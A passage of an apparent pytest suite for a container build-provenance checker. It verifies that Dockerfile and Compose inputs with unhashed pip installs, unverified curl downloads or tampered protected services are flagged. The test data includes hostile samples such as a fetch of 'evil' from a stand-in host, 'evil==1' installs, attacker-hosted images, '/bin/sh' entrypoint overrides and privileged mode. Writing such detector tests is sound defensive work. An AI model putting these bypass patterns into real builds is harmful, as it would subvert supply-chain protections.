    ).records["local_images"][0]["context_sha256"]

    assert after_generated == before
    assert after_material != before

    _write(
        context / "nested/whoscored-build-provenance-manifest.json",
        b"similarly-named-material\n",
    )
    after_nested = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    ).records["local_images"][0]["context_sha256"]
    assert after_nested != after_material


@pytest.mark.parametrize(
    "injected",
    [
        "RUN pip install --require-hashes --only-binary=:all: -r /tmp/airflow.lock && pip3 install evil==1\n",
        "RUN pip install --require-hashes --only-binary=:all: -r /tmp/airflow.lock evil==1\n",
    ],
)
def test_each_pip_invocation_must_be_an_isolated_hash_lock(
    tmp_path: Path, injected: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    _write(dockerfile, dockerfile.read_text(encoding="utf-8") + injected)

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert any(
        issue["category"] == "pip_install_without_hash_lock"
        for issue in discovery.issues
    )


def test_airflow_user_hash_lock_requires_exact_user_base() -> None:
    command = (
        "PYTHONUSERBASE=/home/airflow/.local /usr/local/bin/python -S -m pip "
        "install --user --require-hashes --only-binary=:all: "
        "-r /tmp/airflow.lock"
    )

    invocation = provenance._pip_invocations(command)[0]

    assert invocation.interpreter == "airflow"
    assert invocation.lock_only is True


def test_legacy_hash_lock_accepts_isolated_venv_interpreter() -> None:
    command = (
        "PIP_REQUIRE_VIRTUALENV=1 "
        "/opt/legacy-scraper-venv/bin/python -I -m pip install "
        "--require-hashes --only-binary=:all: -r /tmp/legacy.lock"
    )

    invocation = provenance._pip_invocations(command)[0]

    assert invocation.interpreter == "legacy-scraper"
    assert invocation.lock_only is True


@pytest.mark.parametrize(
    "command",
    [
        "/usr/local/bin/python -S -m pip install --user --require-hashes "
        "--only-binary=:all: -r /tmp/airflow.lock",
        "PYTHONUSERBASE=/tmp/wrong /usr/local/bin/python -S -m pip install "
        "--user --require-hashes --only-binary=:all: -r /tmp/airflow.lock",
        "PYTHONUSERBASE=/home/airflow/.local "
        "/opt/legacy-scraper-venv/bin/python -S -m pip install --user "
        "--require-hashes --only-binary=:all: -r /tmp/legacy.lock",
    ],
)
def test_user_hash_lock_rejects_ambiguous_or_legacy_destination(command: str) -> None:
    invocation = provenance._pip_invocations(command)[0]

    assert invocation.lock_only is False


def test_download_receipt_must_bind_fetch_output_hash_and_size(tmp_path: Path) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    _write(
        dockerfile,
        dockerfile.read_text(encoding="utf-8")
        + f"RUN curl -o /tmp/evil https://example.invalid/evil && echo '{SHA_A}  /tmp/dummy' | sha256sum -c - && test \"$(stat -c %s /tmp/dummy)\" -eq 999\n",
    )

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert any(
        issue["category"] == "download_artifact_unverified" and "evil" in issue["input"]
        for issue in discovery.issues
    )


@pytest.mark.parametrize(
    "curl_flags",
    [
        "--proto '=https' --tlsv1.2 --proto-redir '=https' -fsSL",
        BOUNDED_CURL_FLAGS,
    ],
)
def test_download_receipt_accepts_exact_https_only_curl_flags(
    curl_flags: str,
) -> None:
    command = DOWNLOAD_RUN.removeprefix("RUN ").replace(
        "curl -fsSL", f"curl {curl_flags}", 1
    )

    assert provenance._canonical_fetch_receipt(command, "curl") is True


@pytest.mark.parametrize(
    ("bounded_flag", "unsafe_value"),
    [
        ("--connect-timeout 20", "--connect-timeout 0"),
        ("--speed-limit 1024", "--speed-limit 0"),
        ("--speed-time 60", "--speed-time 0"),
        ("--max-time 3600", "--max-time 0"),
    ],
)
def test_download_receipt_rejects_relaxed_bounded_curl_flags(
    bounded_flag: str, unsafe_value: str
) -> None:
    command = DOWNLOAD_RUN.removeprefix("RUN ").replace(
        "curl -fsSL",
        f"curl {BOUNDED_CURL_FLAGS.replace(bounded_flag, unsafe_value)}",
        1,
    )

    assert provenance._canonical_fetch_receipt(command, "curl") is False


@pytest.mark.parametrize(
    "curl_flags",
    [
        "--proto '=http,https' --tlsv1.2 --proto-redir '=https' -fsSL",
        "--proto '=https' --tlsv1.2 --proto-redir '=http,https' -fsSL",
        "--proto '=https' --tlsv1.0 --proto-redir '=https' -fsSL",
    ],
)
def test_download_receipt_rejects_weakened_curl_transport(
    curl_flags: str,
) -> None:
    command = DOWNLOAD_RUN.removeprefix("RUN ").replace(
        "curl -fsSL", f"curl {curl_flags}", 1
    )

    assert provenance._canonical_fetch_receipt(command, "curl") is False


@pytest.mark.parametrize(
    "suffix",
    [
        " || true",
        " && printf evil > /tmp/Release",
    ],
)
def test_download_receipt_rejects_ignored_failure_or_post_hash_mutation(
    tmp_path: Path, suffix: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    source = dockerfile.read_text(encoding="utf-8")
    source = source.replace(
        'test "$(stat -c %s /tmp/Release)" -eq 1234',
        'test "$(stat -c %s /tmp/Release)" -eq 1234' + suffix,
        1,
    )
    _write(dockerfile, source)

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert any(
        issue["category"] == "download_artifact_unverified"
        and "Release" in issue["input"]
        for issue in discovery.issues
    )


def test_dummy_snapshot_receipt_does_not_attest_mutable_apt_sources(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    source = dockerfile.read_text(encoding="utf-8").replace(
        f"RUN {APT_SOURCE_SETUP} && ",
        "RUN ",
    )
    _write(dockerfile, source)

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert any(
        issue["category"] == "apt_snapshot_mutable" for issue in discovery.issues
    )
    assert discovery.records["apt_snapshots"] == []


def test_unrelated_snapshot_note_does_not_attest_mutable_apt_source(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    canonical = f"RUN {APT_SOURCE_SETUP} && {APT_COMMAND} update"
    bypass = (
        "RUN rm -rf /etc/apt/sources.list.d /var/lib/apt/lists/* && "
        "printf '%s\\n' 'https://snapshot.debian.org/archive/debian/"
        "20240101T000000Z' >/tmp/snapshot-note && printf '%s\\n' "
        "'deb https://deb.debian.org/debian bookworm main' "
        f">/etc/apt/sources.list && {APT_COMMAND} update"
    )
    _write(
        dockerfile,
        dockerfile.read_text(encoding="utf-8").replace(canonical, bypass, 1),
    )

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert any(
        issue["category"] == "apt_snapshot_mutable" for issue in discovery.issues
    )
    assert discovery.records["apt_snapshots"] == []


def test_apt_exact_debian_version_accepts_tilde() -> None:
    discovery = provenance._empty_discovery(ROOT, COMMIT)

    provenance._scan_apt_packages(
        "Dockerfile",
        1,
        "apt-get install chromium=143.0.7499.169-1~deb12u1",
        discovery,
    )

    assert discovery.issues == []
    assert discovery.records["apt_packages"] == [
        {"name": "chromium", "version": "143.0.7499.169-1~deb12u1"}
    ]


@pytest.mark.parametrize(
    "version",
    [
        "143.0.*",
        "143.0.?",
        "143.0.[12]",
        ">=143.0",
        "<143.0",
    ],
)
def test_apt_package_rejects_version_wildcards_and_ranges(version: str) -> None:
    discovery = provenance._empty_discovery(ROOT, COMMIT)

    provenance._scan_apt_packages(
        "Dockerfile", 1, f"apt-get install chromium={version}", discovery
    )

    assert discovery.records["apt_packages"] == []
    assert discovery.issues == [
        {
            "category": "apt_package_unversioned",
            "detail": "APT package is not pinned with name=version",
            "input": f"Dockerfile:1:chromium={version}",
        }
    ]


def test_json_form_pip_install_is_rejected_even_without_network(tmp_path: Path) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    _write(
        dockerfile,
        dockerfile.read_text(encoding="utf-8")
        + 'RUN --network=none ["pip","install","./evil"]\n',
    )

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert any(
        issue["category"] == "pip_install_without_hash_lock"
        for issue in discovery.issues
    )


def test_wrapped_unparsed_pip_install_emits_issue_without_crashing(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    _write(
        dockerfile,
        dockerfile.read_text(encoding="utf-8")
        + "RUN --network=none sh -c 'pip install evil==1'\n",
    )

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert any(
        issue["category"] == "pip_install_without_hash_lock"
        and issue["input"].endswith(":unparsed")
        for issue in discovery.issues
    )


def test_unknown_network_enabled_run_is_rejected(tmp_path: Path) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    _write(
        dockerfile,
        dockerfile.read_text(encoding="utf-8")
        + "RUN mystery-fetch https://example.invalid/mutable-input\n",
    )

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    categories = {issue["category"] for issue in discovery.issues}
    assert "download_artifact_unverified" in categories
    assert "local_image_provenance_absent" in categories


@pytest.mark.parametrize(
    "override",
    [
        "    image: attacker.invalid/scheduler@sha256:" + SHA_A,
        "    entrypoint: [/usr/local/libexec/whoscored-python-real]",
        "    volumes: [./attacker.py:/gate.py]",
        "    privileged: true",
    ],
)
def test_production_overlay_cannot_change_protected_service(
    tmp_path: Path, override: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / provenance.PRODUCTION_OVERLAY_RELATIVE,
        f"""services:
  airflow-scheduler:
{override}
""",
    )

    with pytest.raises(provenance.ProvenanceError, match="changes protected"):
        provenance.discover_repository(
            root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
        )


@pytest.mark.parametrize(
    ("service", "target"),
    [
        ("airflow-scheduler", "airflow-scheduler-payload"),
        ("whoscored_paid_gateway", "airflow-whoscored-proxy-payload"),
        ("whoscored_proxy_filter", "airflow-whoscored-proxy-payload"),
    ],
)
def test_compose_cannot_deploy_payload_stage_without_final_gate(
    tmp_path: Path, service: str, target: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        f"""services:
  {service}:
    image: local/unsafe:test
    build:
      context: ./docker/images/airflow
      dockerfile: Dockerfile
      target: {target}
{_protected_command(service)}
""",
    )

    with pytest.raises(provenance.ProvenanceError, match="final gate|payload stage"):
        provenance.discover_repository(
            root, payload_image_ids={service: f"sha256:{SHA_B}"}
        )


@pytest.mark.parametrize(
    "service",
    [
        "airflow-scheduler",
        "whoscored_paid_gateway",
        "whoscored_proxy_filter",
    ],
)
def test_protected_image_alias_cannot_reuse_generic_local_target(
    tmp_path: Path, service: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        f"""services:
  generic-producer:
    image: local/shared:test
    build:
      context: ./docker/images/airflow
      dockerfile: Dockerfile
      target: runtime
  {service}:
    image: local/shared:test
{_protected_command(service)}""",
    )

    with pytest.raises(
        provenance.ProvenanceError, match="direct canonical local build"
    ):
        provenance.discover_repository(
            root, payload_image_ids={service: f"sha256:{SHA_B}"}
        )


def test_duplicate_local_tag_cannot_be_rebuilt_by_a_different_target(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        """services:
  airflow-scheduler:
    image: data-platform-airflow-scheduler:2.11.2-whoscored
    build:
      context: ./docker/images/airflow
      dockerfile: Dockerfile
      target: airflow-scheduler
    command: scheduler
  generic-later-producer:
    image: data-platform-airflow-scheduler:2.11.2-whoscored
    build:
      context: ./docker/images/airflow
      dockerfile: Dockerfile
      target: runtime
""",
    )

    with pytest.raises(provenance.ProvenanceError, match="conflicting build producers"):
        provenance.discover_repository(
            root,
            payload_image_ids={"airflow-scheduler": f"sha256:{SHA_B}"},
        )


@pytest.mark.parametrize(
    ("service", "build"),
    [
        ("airflow-scheduler", "      target: airflow-scheduler\n"),
        ("whoscored_paid_gateway", "      target: airflow-whoscored-proxy\n"),
        ("whoscored_proxy_filter", "      target: airflow-whoscored-proxy\n"),
        ("flaresolverr", ""),
        ("flaresolverr_whoscored_paid", ""),
    ],
)
def test_protected_service_cannot_override_baked_entrypoint(
    tmp_path: Path, service: str, build: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    build_block = ""
    if build:
        build_block = (
            "    build:\n"
            "      context: ./docker/images/airflow\n"
            "      dockerfile: Dockerfile\n"
            f"{build}"
        )
    _write(
        root / "compose.yaml",
        f"""services:
  {service}:
    image: local/protected:test
{build_block}{_protected_command(service)}    entrypoint: [\"/bin/sh\"]
""",
    )

    with pytest.raises(
        provenance.ProvenanceError, match="overrides its image entrypoint"
    ):
        provenance.discover_repository(
            root, payload_image_ids={service: f"sha256:{SHA_B}"}
        )


def test_protected_service_cannot_inherit_entrypoint_override_from_anchor(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        """x-unsafe: &unsafe
  entrypoint: [\"/bin/sh\"]
services:
  airflow-scheduler:
    <<: *unsafe
    image: local/protected:test
    build:
      context: ./docker/images/airflow
      dockerfile: Dockerfile
      target: airflow-scheduler
    command: scheduler
""",
    )

    with pytest.raises(
        provenance.ProvenanceError, match="overrides its image entrypoint"
    ):
        provenance.discover_repository(
            root,
            payload_image_ids={"airflow-scheduler": f"sha256:{SHA_B}"},
        )


@pytest.mark.parametrize(
    ("service", "command", "message"),
    [
        ("airflow-scheduler", "webserver", "scheduler Compose command"),
        (
            "whoscored_paid_gateway",
            "python /tmp/bypass.py",
            "paid gateway Compose command",
        ),
        ("whoscored_proxy_filter", "python /tmp/bypass.py", "proxy Compose command"),
        ("flaresolverr", "/bin/sh", "FlareSolverr Compose command"),
        (
            "flaresolverr_whoscored_paid",
            "/bin/sh",
            "FlareSolverr Compose command",
        ),
    ],
)
def test_protected_service_command_must_match_baked_gate_policy(
    tmp_path: Path, service: str, command: str, message: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        f"""services:
  {service}:
    image: example.invalid/protected@sha256:{SHA_A}
    command: {command}
""",
    )

    with pytest.raises(provenance.ProvenanceError, match=message):
        provenance.discover_repository(
            root, payload_image_ids={service: f"sha256:{SHA_B}"}
        )


@pytest.mark.parametrize(
    "unsafe_key",
    [
        '    "entrypoint": ["/bin/sh"]',
        '    entrypoint : ["/bin/sh"]',
        '    "command": ["/bin/sh"]',
        '    command : ["/bin/sh"]',
    ],
)
def test_protected_execution_keys_require_canonical_yaml(
    tmp_path: Path, unsafe_key: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        f"""services:
  flaresolverr:
    image: data-platform-flaresolverr-whoscored:3.4.6
    build:
      context: .
      dockerfile: docker/images/flaresolverr-whoscored/Dockerfile
{unsafe_key}
""",
    )

    with pytest.raises(provenance.ProvenanceError, match="noncanonical YAML"):
        provenance.discover_repository(root)


@pytest.mark.parametrize(
    "merge",
    ["    <<: [*unsafe]", "    << : *unsafe"],
)
def test_protected_service_rejects_unmodelled_anchor_merge(
    tmp_path: Path, merge: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        f"""x-unsafe: &unsafe
  entrypoint: [\"/bin/sh\"]
services:
  airflow-scheduler:
{merge}
    image: data-platform-airflow-scheduler:2.11.2-whoscored
    build:
      context: ./docker/images/airflow
      dockerfile: Dockerfile
      target: airflow-scheduler
    command: scheduler
""",
    )

    with pytest.raises(provenance.ProvenanceError, match="merge|noncanonical YAML"):
        provenance.discover_repository(root)


def test_quoted_image_key_cannot_hide_conflicting_local_producer(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        """services:
  generic:
    "image": data-platform-airflow-scheduler:2.11.2-whoscored
    build:
      context: ./docker/images/airflow
      dockerfile: Dockerfile
      target: runtime
""",
    )

    with pytest.raises(provenance.ProvenanceError, match="noncanonical YAML"):
        provenance.discover_repository(root)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("image", "${ALIAS:-local/interpolated:test}"),
        ("context", "${CONTEXT:-./docker/images/airflow}"),
        ("dockerfile", "${DOCKERFILE:-Dockerfile}"),
        ("target", "${TARGET:-runtime}"),
    ],
)
def test_local_build_identity_rejects_compose_interpolation(
    tmp_path: Path, field: str, value: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    values = {
        "image": "local/interpolated:test",
        "context": "./docker/images/airflow",
        "dockerfile": "Dockerfile",
        "target": "runtime",
    }
    values[field] = value
    _write(
        root / "compose.yaml",
        f"""services:
  generic:
    image: {values["image"]}
    build:
      context: {values["context"]}
      dockerfile: {values["dockerfile"]}
      target: {values["target"]}
""",
    )

    with pytest.raises(provenance.ProvenanceError, match="interpolation"):
        provenance.discover_repository(root)


def test_docker_hub_alias_cannot_hide_duplicate_local_tag(tmp_path: Path) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        """services:
  airflow-scheduler:
    image: data-platform-airflow-scheduler:2.11.2-whoscored
    build:
      context: ./docker/images/airflow
      dockerfile: Dockerfile
      target: airflow-scheduler
    command: scheduler
  generic-later:
    image: docker.io/data-platform-airflow-scheduler:2.11.2-whoscored
    build:
      context: ./docker/images/airflow
      dockerfile: Dockerfile
      target: runtime
""",
    )

    with pytest.raises(provenance.ProvenanceError, match="conflicting build producers"):
        provenance.discover_repository(root)


@pytest.mark.parametrize("service", ["airflow-scheduler", "whoscored_proxy_filter"])
def test_protected_airflow_service_cannot_use_external_pinned_image(
    tmp_path: Path, service: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        f"""services:
  {service}:
    image: attacker.invalid/ungated@sha256:{SHA_A}
{_protected_command(service)}""",
    )

    with pytest.raises(
        provenance.ProvenanceError, match="direct canonical local build"
    ):
        provenance.discover_repository(root)


def test_flaresolverr_cannot_use_pinned_stock_image(tmp_path: Path) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        f"""services:
  flaresolverr:
    image: ghcr.io/flaresolverr/flaresolverr:v3.4.6@sha256:{SHA_A}
""",
    )

    with pytest.raises(
        provenance.ProvenanceError, match="direct canonical local build"
    ):
        provenance.discover_repository(root)


@pytest.mark.parametrize(
    ("context", "dockerfile"),
    [
        ("./attacker", "Dockerfile"),
        ("./docker/images/airflow", "Attacker.Dockerfile"),
    ],
)
def test_scheduler_build_context_and_dockerfile_are_exact(
    tmp_path: Path, context: str, dockerfile: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        f"""services:
  airflow-scheduler:
    image: data-platform-airflow-scheduler:2.11.2-whoscored
    build:
      context: {context}
      dockerfile: {dockerfile}
      target: airflow-scheduler
    command: scheduler
""",
    )

    with pytest.raises(provenance.ProvenanceError, match="build identity"):
        provenance.discover_repository(root)


def test_compose_include_is_rejected_before_conflicting_service_can_hide(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    compose = root / "compose.yaml"
    _write(compose, compose.read_text(encoding="utf-8") + "include: attacker.yaml\n")
    _write(root / "attacker.yaml", "services: {}\n")

    with pytest.raises(provenance.ProvenanceError, match="top-level Compose input"):
        provenance.discover_repository(root)


def test_merged_anchor_cannot_hide_extends_input(tmp_path: Path) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    _write(
        root / "compose.yaml",
        """x-unsafe: &unsafe
  extends:
    file: attacker.yaml
    service: attacker
services:
  generic:
    <<: *unsafe
    image: local/generic:test
    build:
      context: ./docker/images/airflow
      dockerfile: Dockerfile
      target: runtime
""",
    )

    with pytest.raises(provenance.ProvenanceError, match="unsafe anchor"):
        provenance.discover_repository(root)


def test_orphan_stage_snapshot_receipt_cannot_attest_selected_target(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    source = dockerfile.read_text(encoding="utf-8").replace(
        DOWNLOAD_RUN, "RUN --network=none true", 1
    )
    source += f"\nFROM python:3.11@sha256:{SHA_A} AS orphan-receipt\n{DOWNLOAD_RUN}\n"
    _write(dockerfile, source)

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert discovery.records["apt_snapshots"] == []
    assert any(
        issue["category"] == "apt_snapshot_mutable" for issue in discovery.issues
    )


def test_orphan_stage_python_locks_cannot_attest_selected_target(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    lock_block = """COPY airflow.lock /tmp/airflow.lock
COPY legacy.lock /tmp/legacy.lock
RUN pip install --require-hashes --only-binary=:all: -r /tmp/airflow.lock
RUN /opt/legacy-scraper-venv/bin/pip install --require-hashes --only-binary=:all: -r /tmp/legacy.lock
"""
    source = dockerfile.read_text(encoding="utf-8").replace(lock_block, "", 1)
    source += f"\nFROM python:3.11@sha256:{SHA_A} AS orphan-locks\n{lock_block}"
    _write(dockerfile, source)

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert discovery.records["python_locks"] == []
    missing = {
        issue["input"]
        for issue in discovery.issues
        if issue["category"] == "python_interpreter_lock_missing"
    }
    assert any(value.endswith(":runtime:airflow") for value in missing)
    assert any(value.endswith(":runtime:legacy-scraper") for value in missing)


def test_unrelated_copy_dependency_locks_do_not_attest_target_interpreter(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    lock_block = """COPY airflow.lock /tmp/airflow.lock
COPY legacy.lock /tmp/legacy.lock
RUN pip install --require-hashes --only-binary=:all: -r /tmp/airflow.lock
RUN /opt/legacy-scraper-venv/bin/pip install --require-hashes --only-binary=:all: -r /tmp/legacy.lock
"""
    source = dockerfile.read_text(encoding="utf-8").replace(lock_block, "", 1)
    source = source.replace(
        "FROM runtime-payload AS runtime\n",
        f"FROM python:3.11@sha256:{SHA_A} AS unrelated-locks\n"
        f"{lock_block}"
        "RUN --network=none printf unrelated >/tmp/unrelated\n"
        "FROM runtime-payload AS runtime\n"
        "COPY --from=unrelated-locks /tmp/unrelated /tmp/unrelated\n",
        1,
    )
    _write(dockerfile, source)

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert {record["interpreter"] for record in discovery.records["python_locks"]} == {
        "airflow",
        "legacy-scraper",
    }
    assert (
        sum(
            issue["category"] == "python_interpreter_lock_missing"
            for issue in discovery.issues
        )
        >= 2
    )


def test_copy_reachable_builder_unhashed_pip_install_is_scanned(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    source = dockerfile.read_text(encoding="utf-8").replace(
        "FROM runtime-payload AS runtime\n",
        f"FROM python:3.11@sha256:{SHA_A} AS mutable-builder\n"
        "RUN pip install evil==1\n"
        "RUN --network=none printf output >/tmp/output\n"
        "FROM runtime-payload AS runtime\n"
        "COPY --from=mutable-builder /tmp/output /tmp/output\n",
        1,
    )
    _write(dockerfile, source)

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert any(
        issue["category"] == "pip_install_without_hash_lock"
        for issue in discovery.issues
    )


def test_copy_dependency_python_base_does_not_manufacture_target_abi() -> None:
    closure = provenance.DockerfileClosure(
        bases_by_target={
            "runtime": [f"busybox@sha256:{SHA_A}", f"python:3.11@sha256:{SHA_B}"]
        },
        dependencies_by_stage={"runtime": {"python-builder"}, "python-builder": set()},
        direct_base_by_stage={
            "runtime": f"busybox@sha256:{SHA_A}",
            "python-builder": f"python:3.11@sha256:{SHA_B}",
        },
        generated_outputs_by_stage={"runtime": set(), "python-builder": set()},
        instructions_by_stage={"runtime": [], "python-builder": []},
        parent_by_stage={"runtime": None, "python-builder": None},
        stage_by_line={},
        final_stage="runtime",
    )

    assert provenance._python_abi_for_stage(closure, "runtime") == ""


def _python_alias_closure(*instructions: str) -> provenance.DockerfileClosure:
    return provenance.DockerfileClosure(
        bases_by_target={
            "python3.10-runtime": [
                f"busybox@sha256:{SHA_A}",
                f"python:3.11@sha256:{SHA_B}",
            ]
        },
        dependencies_by_stage={
            "python3.10-runtime": {"python-builder"},
            "python-builder": set(),
        },
        direct_base_by_stage={
            "python3.10-runtime": f"busybox@sha256:{SHA_A}",
            "python-builder": f"python:3.11@sha256:{SHA_B}",
        },
        generated_outputs_by_stage={
            "python3.10-runtime": set(),
            "python-builder": set(),
        },
        instructions_by_stage={
            "python3.10-runtime": [
                f"FROM busybox@sha256:{SHA_A} AS python3.10-runtime",
                *instructions,
            ],
            "python-builder": [
                f"FROM python:3.11@sha256:{SHA_B} AS python-builder"
            ],
        },
        parent_by_stage={"python3.10-runtime": None, "python-builder": None},
        stage_by_line={},
        final_stage="python3.10-runtime",
    )


def _python_version_proof(
    major: int, minor: int, *, run_options: str = "--network=none"
) -> str:
    return (
        f"RUN {run_options} python -m pip check && "
        'python -c "import sys; raise SystemExit('
        f'sys.version_info[:2] != ({major}, {minor}))"'
    )


def test_stage_alias_sets_python_abi_without_copy_dependency_override() -> None:
    closure = _python_alias_closure(_python_version_proof(3, 10))

    assert provenance._python_abi_for_stage(closure, "python3.10-runtime") == "cp310"


@pytest.mark.parametrize(
    "instructions",
    [
        [
            "RUN --network=none python -m pip check && "
            'python -c "import sys; assert sys.version_info[:2] == (3, 10)"'
        ],
        [_python_version_proof(3, 10, run_options="--network=none --network=host")],
        [_python_version_proof(3, 10), _python_version_proof(3, 10)],
        [_python_version_proof(3, 10), _python_version_proof(3, 11)],
        [_python_version_proof(3, 10), "RUN --network=none true"],
    ],
    ids=[
        "optimizable-assert",
        "second-network-mode",
        "duplicate-proof",
        "conflicting-proof",
        "post-proof-mutation",
    ],
)
def test_stage_alias_rejects_bypassable_or_ambiguous_proof(
    instructions: list[str],
) -> None:
    closure = _python_alias_closure(*instructions)

    assert provenance._python_abi_for_stage(closure, "python3.10-runtime") == ""


@pytest.mark.parametrize(
    "version_assertion",
    [
        "",
        "RUN --network=none python -m pip check && "
        'python -c "import sys; raise SystemExit('
        'sys.version_info[:2] != (3, 11))"\n',
    ],
)
def test_stage_alias_lock_requires_matching_offline_version_assertion(
    tmp_path: Path, version_assertion: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    source = dockerfile.read_text(encoding="utf-8").replace(
        f"FROM python:3.11@sha256:{SHA_A} AS runtime-payload",
        f"FROM busybox@sha256:{SHA_A} AS python3.10-runtime",
        1,
    )
    source = source.replace(
        "FROM runtime-payload AS runtime",
        f"{version_assertion}FROM python3.10-runtime AS runtime",
        1,
    )
    _write(dockerfile, source)

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert discovery.records["python_locks"] == []
    assert sum(
        issue["category"] == "python_interpreter_lock_missing"
        and "matching offline assertion" in issue["detail"]
        for issue in discovery.issues
    ) == 2


def test_stage_alias_lock_accepts_matching_offline_version_assertion(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    source = dockerfile.read_text(encoding="utf-8").replace(
        f"FROM python:3.11@sha256:{SHA_A} AS runtime-payload",
        f"FROM busybox@sha256:{SHA_A} AS python3.10-runtime",
        1,
    )
    source = source.replace(
        "FROM runtime-payload AS runtime",
        "RUN --network=none python -m pip check && "
        'python -c "import sys; raise SystemExit('
        'sys.version_info[:2] != (3, 10))"\n'
        "FROM python3.10-runtime AS runtime",
        1,
    )
    _write(dockerfile, source)

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert len(discovery.records["python_locks"]) == 2
    assert {
        record["python_abi"] for record in discovery.records["python_locks"]
    } == {"cp310"}


def test_copy_from_stage_propagates_generated_evidence_taint(tmp_path: Path) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    original_final = """FROM runtime-payload AS runtime
COPY whoscored-build-provenance-attestation.json /evidence/attestation.json
COPY whoscored-build-provenance-manifest.json /evidence/manifest.json
"""
    tainted_final = """FROM runtime-payload AS evidence-carrier
COPY whoscored-build-provenance-attestation.json /evidence/attestation.json
COPY whoscored-build-provenance-manifest.json /evidence/manifest.json
FROM runtime-payload AS runtime
COPY --from=evidence-carrier /evidence /evidence
"""
    _write(
        dockerfile,
        dockerfile.read_text(encoding="utf-8").replace(
            original_final, tainted_final, 1
        ),
    )

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    record = discovery.records["local_images"][0]
    assert record["payload_target"] == ""
    assert any(
        issue["category"] == "local_image_provenance_absent"
        and "self-reference-free payload target" in issue["detail"]
        for issue in discovery.issues
    )


@pytest.mark.parametrize(
    "mutation",
    [
        "ansi-newline",
        "stale-lists",
        "missing-source-options",
        "alternate-lists",
        "apt-config-env",
        "unrelated-snapshot-file",
    ],
)
